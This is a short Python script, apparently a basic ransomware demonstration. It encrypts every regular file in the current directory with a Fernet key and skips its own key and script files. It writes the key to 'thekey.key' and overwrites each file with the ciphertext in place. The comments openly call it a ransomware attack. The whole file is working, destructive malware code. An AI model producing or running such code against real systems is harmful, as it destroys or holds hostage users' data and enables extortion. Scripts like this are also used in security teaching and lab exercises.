import os
from cryptography.fernet import Fernet

# Files will store the file we want to ransomware
files = []

# Ignoring the ransomware attack files
for file in os.listdir():
  if file == "thekey.key" or file == "supersafe.py" or file == "script.sh":
    continue
  if os.path.isfile(file):
    files.append(file)
#generating ransomware key
key = Fernet.generate_key()
# writing it in thekey.key file
with open("thekey.key", "wb") as thekey:
  thekey.write(key)
# Reading the contents of the file and encrypting with ransomware attack file
for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = Fernet(key).encrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)
